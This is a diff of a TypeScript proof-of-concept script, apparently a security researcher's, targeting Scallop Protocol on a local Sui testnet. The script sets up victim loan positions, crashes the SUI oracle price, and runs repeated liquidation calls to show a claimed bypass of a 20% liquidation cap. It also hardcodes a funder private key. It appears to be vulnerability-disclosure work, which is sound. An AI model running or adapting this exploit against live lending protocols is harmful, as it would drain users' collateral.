@@ -2,6 +2,7 @@
 /**
  * PoC: Multi-Call Liquidation Bypasses 20% Soft Cap
  * Target: Scallop Protocol (Local Testnet)
+ * SDK: @mysten/sui (Official)
  */
 
 import { SuiClient } from '@mysten/sui/client';
@@ -11,23 +12,23 @@ import { decodeSuiPrivateKey } from '@mysten/sui/cryptography';
 
 const client = new SuiClient({ url: 'http://127.0.0.1:9000' });
 
-// ==================== KONFIGURASI LOCAL TESTNET (ID AKTIF SEKARANG) ====================
-// Protocol  → tx AUvkoDLz... (package 0x13ff...)
-const PKG      = "0x13ff85977d6d8590337696815702ef416c06f7545e61795fd99d256050dbaa45";
-const VERSION  = "0x836c1f8c03b508a88c4066f6d76ff411e9648c34a3452a755e4563d0d7bcc664";
-const MARKET   = "0xced8335a99c002986b5295ce5a0579bec8bef5d8ed7d4283537e1f2d8bda926a";
-const ORACLE   = "0x0d74b0607c2596f8d81a853dcf9581febe15cadc68e03aecd58ad3428063a3d5";
-const REGISTRY = "0xcd83a256d50ca53b43c47eba7f6e8308d98cafa51c1f7c103a3fabc382a5ff08";
-const CLOCK    = "0x6";
+// ==================== KONFIGURASI LOCAL TESTNET ====================
+// ID Valid dari output_protocol.json.txt
+const PKG = "0x4447fa7f281993207692ba0eeff209c699316c0fbdc42c5a1e27e59d4dd6fd60";
+const VERSION = "0xa7f721da1598fd7ba932ed3ef85958ada1318cc8697df2a30e2491d7e0a9c6d2";
+const MARKET = "0x6044e8e1a7a3d768474678f93a80dee16921ee712768b22c2c70b4486f0cd49d";
+const ORACLE = "0x3a7e716c73f7f0471bf7221aea3d31e3729ec0dbd1cf62da73cedbb03ce75d1e";
+const REGISTRY = "0xa9f387b821f15ef02e151facd8fdcffe1c14a766538f677d8dd8b95a8c751fee";
+const CLOCK = "0x6";
 
-// TestCoin → tx D6Uzn3s... (package 0x8f89...)
-const TEST_COIN_PKG = "0x8f894df0030ef5017603d15072ed6eea29eb9a4f232651e4375afb3bbe25fa44";
+// ID Valid dari output_testcoin (2).json.txt
+const TEST_COIN_PKG = "0x0e027cb787e9735b869ad976bb6b2d4497d0addb415e1372cbfca2784a953ab0";
 const USDC_TYPE = `${TEST_COIN_PKG}::usdc::USDC`;
-const ETH_TYPE  = `${TEST_COIN_PKG}::eth::ETH`;
-const SUI_TYPE  = "0x2::sui::SUI";
+const ETH_TYPE = `${TEST_COIN_PKG}::eth::ETH`;
+const SUI_TYPE = "0x2::sui::SUI";
 
-const USDC_TREASURY = "0x3e0938e690e019f2009a4c22e5cc7e1b6b5a0d577ab654bddfcd2f61e9eb82a8";
-const ETH_TREASURY  = "0x552ddbf62361548ef69d2bccbfd6bef25180a455c5f1b6c6918a1d461a12e0fa";
+const USDC_TREASURY = "0xc2deb84266c8ef88d43f35dba448c896f806e662e0b562de4c5f62f36cf49711";
+const ETH_TREASURY = "0xab8944a758a3a3de2d6c8a6a9dac3dad5ced71ac9885f51327c1523ec77a1336";
 
 // PRIVATE KEY FUNDER
 const funderPrivateKeyStr = "suiprivkey1qzuxayfjwjmrqat03vkjh5nrt66fp4utywud2x8v0k0a6fg453yg7j2kcaa";
@@ -83,6 +84,7 @@ async function getXOraclePackage(): Promise<string> {
 }
 
 // ==================== HELPER FUNCTIONS ====================
+
 async function executeTx(tx, keypair) {
     tx.setSender(keypair.getPublicKey().toSuiAddress());
     const result = await client.signAndExecuteTransaction({
@@ -123,9 +125,10 @@ async function readObligationState(obligationId) {
 }
 
 // ==================== PHASE 0: INITIALIZE MARKET ====================
+
 async function initializeMarket(adminCapId) {
     console.log("\n[INIT] Initializing Market (Whitelist, Models, Oracle)...");
-
+    
     const suiMetaId = await findCoinMetadata(SUI_TYPE);
     const usdcMetaId = await findCoinMetadata(USDC_TYPE);
     const ethMetaId = await findCoinMetadata(ETH_TYPE);
@@ -215,7 +218,6 @@ async function initializeMarket(adminCapId) {
         });
     };
 
-    // FIX: daftarkan supply limit agar mint::mint tidak abort EFieldDoesNotExist
     const setSupplyLimit = (coinType, limit) => {
         tx.moveCall({
             target: `${PKG}::app::update_supply_limit`,
@@ -296,6 +298,7 @@ async function whitelistVictim(adminCapId, victimAddr, label) {
 }
 
 // ==================== PHASE 1: SETUP VICTIM ====================
+
 async function setupVictim(victimKeypair, label, adminCapId, xOraclePkg) {
     const victimAddr = victimKeypair.getPublicKey().toSuiAddress();
     console.log(`\n[${label}] Setting up victim at ${victimAddr}...`);
@@ -348,6 +351,7 @@ async function setupVictim(victimKeypair, label, adminCapId, xOraclePkg) {
     await executeTx(depositTx, victimKeypair);
     console.log(`[${label}] Step 3 done: Deposited 1000 SUI collateral`);
 
+    // --- STEP 4: Mint & Supply USDC & ETH ke Market ---
     const supplyTx = new Transaction();
 
     const [usdcCoin] = supplyTx.moveCall({
@@ -359,11 +363,8 @@ async function setupVictim(victimKeypair, label, adminCapId, xOraclePkg) {
         typeArguments: [USDC_TYPE],
         arguments: [supplyTx.object(VERSION), supplyTx.object(MARKET), usdcCoin, supplyTx.object(CLOCK)],
     });
-    supplyTx.moveCall({
-        target: `0x2::coin::destroy_zero`,
-        typeArguments: [`${PKG}::reserve::MarketCoin<${USDC_TYPE}>`],
-        arguments: [sUSDC],
-    });
+    // ✅ FIX: Transfer sUSDC ke funder, JANGAN destroy_zero (sCoin punya nilai > 0)
+    supplyTx.transferObjects([sUSDC], funderAddress);
 
     const [ethCoin] = supplyTx.moveCall({
         target: `${TEST_COIN_PKG}::eth::mint`,
@@ -374,17 +375,14 @@ async function setupVictim(victimKeypair, label, adminCapId, xOraclePkg) {
         typeArguments: [ETH_TYPE],
         arguments: [supplyTx.object(VERSION), supplyTx.object(MARKET), ethCoin, supplyTx.object(CLOCK)],
     });
-    supplyTx.moveCall({
-        target: `0x2::coin::destroy_zero`,
-        typeArguments: [`${PKG}::reserve::MarketCoin<${ETH_TYPE}>`],
-        arguments: [sETH],
-    });
+    // ✅ FIX: Transfer sETH ke funder, JANGAN destroy_zero (sCoin punya nilai > 0)
+    supplyTx.transferObjects([sETH], funderAddress);
 
     await executeTx(supplyTx, funderKeypair);
     console.log(`[${label}] Step 4 done: Minted and supplied USDC and ETH to market`);
 
     const initPriceTx = new Transaction();
-
+    
     initPriceTx.moveCall({
         target: `${xOraclePkg}::x_oracle::update_price`,
         typeArguments: [SUI_TYPE],
@@ -448,20 +446,28 @@ async function setupVictim(victimKeypair, label, adminCapId, xOraclePkg) {
     return { obligationId, obligationKeyId };
 }
 
-// ==================== PHASE 2: TRIGGER ====================
+// ==================== PHASE 2: TRIGGER (MANIPULASI ORACLE) ====================
+
 async function crashOraclePrice(xOraclePkg) {
     console.log("\n[TRIGGER] Crashing SUI price to $0.40 via Oracle Update...");
     const tx = new Transaction();
+    
     tx.moveCall({
         target: `${xOraclePkg}::x_oracle::update_price`,
         typeArguments: [SUI_TYPE],
-        arguments: [tx.object(ORACLE), tx.object(CLOCK), tx.pure.u64(40_000_000n)],
+        arguments: [
+            tx.object(ORACLE),
+            tx.object(CLOCK),
+            tx.pure.u64(40_000_000n),
+        ],
     });
+    
     await executeTx(tx, funderKeypair);
     console.log("[TRIGGER] SUI price crashed. Victims are now UNHEALTHY!");
 }
 
-// ==================== PHASE 3: BEFORE EXPLOIT ====================
+// ==================== PHASE 3: BEFORE EXPLOIT (Single Call) ====================
+
 async function beforeExploit_singleCall(victimObligationId) {
     console.log("\n" + "=".repeat(60));
     console.log("BEFORE EXPLOIT: Single Liquidation Call");
@@ -508,7 +514,8 @@ async function beforeExploit_singleCall(victimObligationId) {
     return { extracted };
 }
 
-// ==================== PHASE 4: AFTER EXPLOIT ====================
+// ==================== PHASE 4: AFTER EXPLOIT (Multi Call) ====================
+
 async function afterExploit_multiCall(victimObligationId) {
     console.log("\n" + "=".repeat(60));
     console.log("AFTER EXPLOIT: Multi-Call Liquidation");
@@ -581,7 +588,8 @@ async function afterExploit_multiCall(victimObligationId) {
     return { extracted };
 }
 
-// ==================== MAIN ====================
+// ==================== MAIN EXECUTION ====================
+
 async function main() {
     console.log("╔═══════════════════════════════════════════════════════════╗");
     console.log("║  PoC: Multi-Call Liquidation Bypass (Local Testnet)       ║");
